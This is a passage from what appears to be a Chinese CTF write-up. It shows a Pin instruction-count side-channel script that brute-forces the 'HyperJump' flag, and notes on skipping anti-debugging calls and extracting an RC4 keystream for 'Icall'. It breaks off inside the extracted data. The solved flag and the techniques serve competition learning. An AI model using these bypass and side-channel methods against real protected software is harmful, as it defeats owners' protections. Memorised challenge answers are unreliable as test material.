+</span></span></code></pre></td></tr></table></div></div><p><img src=https://su-team.cn/img/2025-QWNT/7.png alt=img></p><h2 id=ecshop>ecshop</h2><p>不告诉你，这个就是很 ez，自己审代码去吧</p><p><img src=https://su-team.cn/img/2025-QWNT/19.png alt=img></p><h1 id=reverse>Reverse</h1><h2 id=hyperjump>HyperJump</h2><p>Vm逻辑太复杂不想看，发现函数是单字节加密（每次比较一个字节），因此直接pintool爆破了，因为错误会提前退出，导致指令执行数目大大减少</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>FLAG_LEN</span> <span class=o>=</span> <span class=mi>24</span>                 <span class=c1># 标志长度</span>
+</span></span><span class=line><span class=cl><span class=n>CHARSET</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=o>+</span><span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=o>+</span><span class=s2>&#34;_@</span><span class=si>{}</span><span class=s2>&#34;</span>  <span class=c1># 爆破字符集 (a-zA-Z)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 设置 pwntools 上下文</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;info&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_inscount</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    运行 pin 并返回指令数。
+</span></span></span><span class=line><span class=cl><span class=s2>    每次猜测都必须启动一个新进程。
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># 启动进程</span>
+</span></span><span class=line><span class=cl>        <span class=c1># 注意：Pin 可能会将指令数输出到 stderr</span>
+</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=s2>&#34;./pin -t inscount0_cout.so -- ./hyperjump&#34;</span><span class=p>],</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Provide the flag:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=n>out</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>lines</span> <span class=o>=</span> <span class=n>out</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=n>lines</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>line</span><span class=o>.</span><span class=n>isdigit</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;无法从 &#39;</span><span class=si>{</span><span class=n>pin_output</span><span class=si>}</span><span class=s2>&#39; 中解析出指令数&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;执行 payload </span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=s2> 时出错: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># --- 爆破主循环 ---</span>
+</span></span><span class=line><span class=cl><span class=n>known_flag</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=s2>&#34;flag{m4z3d_vm_jump&#34;</span><span class=p>)</span><span class=o>+</span><span class=nb>list</span><span class=p>(</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=n>FLAG_LEN</span><span class=o>-</span><span class=mi>18</span><span class=p>))</span> <span class=c1># 从 &#34;AAAA...&#34; 开始</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;开始爆破 </span><span class=si>{</span><span class=n>BINARY_PATH</span><span class=si>}</span><span class=s2>，长度 </span><span class=si>{</span><span class=n>FLAG_LEN</span><span class=si>}</span><span class=s2>，字符集 </span><span class=si>{</span><span class=n>CHARSET</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>18</span><span class=p>,</span> <span class=n>FLAG_LEN</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;正在爆破第 </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2> 位...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>max_count</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=n>best_char</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1># 遍历所有可能的字符</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>CHARSET</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=c1># 构造测试 payload</span>
+</span></span><span class=line><span class=cl>        <span class=n>current_test</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>known_flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>current_test</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>char</span>
+</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>current_test</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=c1># 获取指令数</span>
+</span></span><span class=line><span class=cl>        <span class=n>count</span> <span class=o>=</span> <span class=n>get_inscount</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>count</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>count</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;字符 &#39;</span><span class=si>{</span><span class=n>char</span><span class=si>}</span><span class=s2>&#39; 获取计数失败，跳过...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=c1># 调试信息</span>
+</span></span><span class=line><span class=cl>        <span class=c1># log.debug(f&#34;测试: {payload} -&gt; {count} 条指令&#34;)</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=c1># 更新最大值</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>count</span> <span class=o>&gt;</span> <span class=n>max_count</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>max_count</span> <span class=o>=</span> <span class=n>count</span>
+</span></span><span class=line><span class=cl>            <span class=n>best_char</span> <span class=o>=</span> <span class=n>char</span>
+</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;发现新的最大值: 字符 &#39;</span><span class=si>{</span><span class=n>best_char</span><span class=si>}</span><span class=s2>&#39; -&gt; </span><span class=si>{</span><span class=n>max_count</span><span class=si>}</span><span class=s2> 条指令&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>best_char</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>known_flag</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>best_char</span>
+</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;第 </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2> 位确定为: &#39;</span><span class=si>{</span><span class=n>best_char</span><span class=si>}</span><span class=s2>&#39;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;当前 Flag: </span><span class=si>{</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>known_flag</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;第 </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2> 位爆破失败，所有字符返回 0？&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;--- 爆破完成 ---&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;最终 Flag: </span><span class=si>{</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>known_flag</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到flag{m4z3d_vm_jump5__42}</p><h2 id=icall>Icall</h2><p>地址混淆+控制流平坦化，不会还原只能上动调</p><p>首先init里出现了pthread_create创建新线程导致调试器附加失败（反调），因此直接跳过pthread_create的调用（IDA来set ip），接着跳过exit的调用</p><p><img src=https://su-team.cn/img/2025-QWNT/20.png alt=img></p><p><img src=https://su-team.cn/img/2025-QWNT/21.png alt=img></p><p>接着就可以F9来到main一点点调试，首先关注到解密出来了一个字符串"arf@gocrying"</p><p><img src=https://su-team.cn/img/2025-QWNT/22.png alt=img></p><p>然后输入字符串</p><p><img src=https://su-team.cn/img/2025-QWNT/23.png alt=img></p><p>然后循环做了放射处理</p><p><img src=https://su-team.cn/img/2025-QWNT/24.png alt=img></p><p>接着就是RC4，观察到了init和异或，同时该流程调用了三次</p><p><img src=https://su-team.cn/img/2025-QWNT/25.png alt=img></p><p><img src=https://su-team.cn/img/2025-QWNT/26.png alt=img></p><p>由于一直没复现出来，所以直接下条件断点提取异或值</p><p><img src=https://su-team.cn/img/2025-QWNT/27.png alt=img></p><p>提取出来异或的v10（keystream，正好是90个，也就是每次加密30个字符）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;108 91
+</span></span></span><span class=line><span class=cl><span class=s2>55 205
+</span></span></span><span class=line><span class=cl><span class=s2>108 85
+</span></span></span><span class=line><span class=cl><span class=s2>57 250
+</span></span></span><span class=line><span class=cl><span class=s2>108 68
+</span></span></span><span class=line><span class=cl><span class=s2>40 195
+</span></span></span><span class=line><span class=cl><span class=s2>108 198
+</span></span></span><span class=line><span class=cl><span class=s2>170 235
+</span></span></span><span class=line><span class=cl><span class=s2>108 116
+</span></span></span><span class=line><span class=cl><span class=s2>24 65
+</span></span></span><span class=line><span class=cl><span class=s2>108 3
+</span></span></span><span class=line><span class=cl><span class=s2>111 89
+</span></span></span><span class=line><span class=cl><span class=s2>108 111
+</span></span></span><span class=line><span class=cl><span class=s2>3 54
+</span></span></span><span class=line><span class=cl><span class=s2>108 163
+</span></span></span><span class=line><span class=cl><span class=s2>207 53
+</span></span></span><span class=line><span class=cl><span class=s2>108 178
+</span></span></span><span class=line><span class=cl><span class=s2>222 250
+</span></span></span><span class=line><span class=cl><span class=s2>108 0
+</span></span></span><span class=line><span class=cl><span class=s2>108 36
+</span></span></span><span class=line><span class=cl><span class=s2>108 48
+</span></span></span><span class=line><span class=cl><span class=s2>92 72
+</span></span></span><span class=line><span class=cl><span class=s2>108 229
+</span></span></span><span class=line><span class=cl><span class=s2>137 20
+</span></span></span><span class=line><span class=cl><span class=s2>108 113
+</span></span></span><span class=line><span class=cl><span class=s2>29 157
+</span></span></span><span class=line><span class=cl><span class=s2>108 126
+</span></span></span><span class=line><span class=cl><span class=s2>18 128
+</span></span></span><span class=line><span class=cl><span class=s2>108 37
+</span></span></span><span class=line><span class=cl><span class=s2>73 146
+</span></span></span><span class=line><span class=cl><span class=s2>108 50
+</span></span></span><span class=line><span class=cl><span class=s2>94 219
+</span></span></span><span class=line><span class=cl><span class=s2>108 90
+</span></span></span><span class=line><span class=cl><span class=s2>54 133
+</span></span></span><span class=line><span class=cl><span class=s2>108 70
+</span></span></span><span class=line><span class=cl><span class=s2>42 179
+</span></span></span><span class=line><span class=cl><span class=s2>108 49
+</span></span></span><span class=line><span class=cl><span class=s2>93 153
+</span></span></span><span class=line><span class=cl><span class=s2>108 237
+</span></span></span><span class=line><span class=cl><span class=s2>129 196
+</span></span></span><span class=line><span class=cl><span class=s2>108 106
+</span></span></span><span class=line><span class=cl><span class=s2>6 69
+</span></span></span><span class=line><span class=cl><span class=s2>108 31
+</span></span></span><span class=line><span class=cl><span class=s2>115 67
+</span></span></span><span class=line><span class=cl><span class=s2>108 210
+</span></span></span><span class=line><span class=cl><span class=s2>190 48
+</span></span></span><span class=line><span class=cl><span class=s2>108 213
+</span></span></span><span class=line><span class=cl><span class=s2>185 142
+</span></span></span><span class=line><span class=cl><span class=s2>108 4
+</span></span></span><span class=line><span class=cl><span class=s2>104 55
+</span></span></span><span class=line><span class=cl><span class=s2>108 74
+</span></span></span><span class=line><span class=cl><span class=s2>38 95
+</span></span></span><span class=line><span class=cl><span class=s2>108 178
+</span></span></span><span class=line><span class=cl><span class=s2>222 121
+</span></span></span><span class=line><span class=cl><span class=s2>108 116
+</span></span></span><span class=line><span class=cl><span class=s2>24 167
+</span></span></span><span class=line><span class=cl><span class=s2>108 223
+</span></span></span><span class=line><span class=cl><span class=s2>179 191
+</span></span></span><span class=line><span class=cl><span class=s2>108 173
+</span></span></span><span class=line><span class=cl><span class=s2>193 12
+</span></span></span><span class=line><span class=cl><span class=s2>250 151
+</span></span></span><span class=line><span class=cl><span class=s2>109 205
+</span></span></span><span class=line><span class=cl><span class=s2>195 116
+</span></span></span><span class=line><span class=cl><span class=s2>183 160
+</span></span></span><span class=line><span class=cl><span class=s2>235 32
+</span></span></span><span class=line><span class=cl><span class=s2>203 23
+</span></span></span><span class=line><span class=cl><span class=s2>65 0
+</span></span></span><span class=line><span class=cl><span class=s2>65 220
+</span></span></span><span class=line><span class=cl><span class=s2>89 235
+</span></span></span><span class=line><span class=cl><span class=s2>178 157
+</span></span></span><span class=line><span class=cl><span class=s2>54 37
+</span></span></span><span class=line><span class=cl><span class=s2>19 47
+</span></span></span><span class=line><span class=cl><span class=s2>53 62
+</span></span></span><span class=line><span class=cl><span class=s2>11 60
+</span></span></span><span class=line><span class=cl><span class=s2>250 237
+</span></span></span><span class=line><span class=cl><span class=s2>23 55
+</span></span></span><span class=line><span class=cl><span class=s2>36 16
+</span></span></span><span class=line><span class=cl><span class=s2>52 32
+</span></span></span><span class=line><span class=cl><span class=s2>72 4
+</span></span></span><span class=line><span class=cl><span class=s2>76 20
+</span></span></span><span class=line><span class=cl><span class=s2>20 132
+</span></span></span><span class=line><span class=cl><span class=s2>144 88
+</span></span></span><span class=line><span class=cl><span class=s2>157 173
+</span></span></span><span class=line><span class=cl><span class=s2>48 200
+</span></span></span><span class=line><span class=cl><span class=s2>128 186
+</span></span></span><span class=line><span class=cl><span class=s2>58 248
+</span></span></span><span class=line><span class=cl><span class=s2>146 245
+</span></span></span><span class=line><span class=cl><span class=s2>103 194
+</span></span></span><span class=line><span class=cl><span class=s2>219 127
+</span></span></span><span class=line><span class=cl><span class=s2>164 165
+</span></span></span><span class=line><span class=cl><span class=s2>133 191
+</span></span></span><span class=line><span class=cl><span class=s2>58 1
+</span></span></span><span class=line><span class=cl><span class=s2>179 150
+</span></span></span><span class=line><span class=cl><span class=s2>37 59
+</span></span></span><span class=line><span class=cl><span class=s2>153 148
+</span></span></span><span class=line><span class=cl><span class=s2>13 30
+</span></span></span><span class=line><span class=cl><span class=s2>196 26
+</span></span></span><span class=line><span class=cl><span class=s2>222 19
+</span></span></span><span class=line><span class=cl><span class=s2>69 132
+</span></span></span><span class=line><span class=cl><span class=s2>193 205
+</span></span></span><span class=line><span class=cl><span class=s2>67 146
+</span></span></span><span class=line><span class=cl><span class=s2>209 12
+</span></span></span><span class=line><span class=cl><span class=s2>48 7
+</span></span></span><span class=line><span class=cl><span class=s2>55 221
+</span></span></span><span class=line><span class=cl><span class=s2>142 206
+</span></span></span><span class=line><span class=cl><span class=s2>64 234
+</span></span></span><span class=line><span class=cl><span class=s2>55 70
+</span></span></span><span class=line><span class=cl><span class=s2>113 170
+</span></span></span><span class=line><span class=cl><span class=s2>95 9
+</span></span></span><span class=line><span class=cl><span class=s2>86 219
+</span></span></span><span class=line><span class=cl><span class=s2>121 217
+</span></span></span><span class=line><span class=cl><span class=s2>160 141
+</span></span></span><span class=line><span class=cl><span class=s2>167 54
+</span></span></span><span class=line><span class=cl><span class=s2>145 45
+</span></span></span><span class=line><span class=cl><span class=s2>191 232
+</span></span></span><span class=line><span class=cl><span class=s2>87 188
+</span></span></span><span class=line><span class=cl><span class=s2>12 41
+</span></span></span><span class=line><span class=cl><span class=s2>37 235
+</span></span></span><span class=line><span class=cl><span class=s2>205 54
+</span></span></span><span class=line><span class=cl><span class=s2>251 206
+</span></span></span><span class=line><span class=cl><span class=s2>160 131
+</span></span></span><span class=line><span class=cl><span class=s2>35 205
+</span></span></span><span class=line><span class=cl><span class=s2>23 111
+</span></span></span><span class=line><span class=cl><span class=s2>120 238
+</span></span></span><span class=line><span class=cl><span class=s2>220 142
+</span></span></span><span class=line><span class=cl><span class=s2>82 150
+</span></span></span><span class=line><span class=cl><span class=s2>157 126
+</span></span></span><span class=line><span class=cl><span class=s2>227 196
+</span></span></span><span class=line><span class=cl><span class=s2>47 62
+</span></span></span><span class=line><span class=cl><span class=s2>17 39
+</span></span></span><span class=line><span class=cl><span class=s2>60 106
+</span></span></span><span class=line><span class=cl><span class=s2>86 54
+</span></span></span><span class=line><span class=cl><span class=s2>55 99
+</span></span></span><span class=line><span class=cl><span class=s2>84 96
+</span></span></span><span class=line><span class=cl><span class=s2>32 116
+</span></span></span><span class=line><span class=cl><span class=s2>84 52
+</span></span></span><span class=line><span class=cl><span class=s2>20 156
+</span></span></span><span class=line><span class=cl><span class=s2>136 96
+</span></span></span><span class=line><span class=cl><span class=s2>88 245
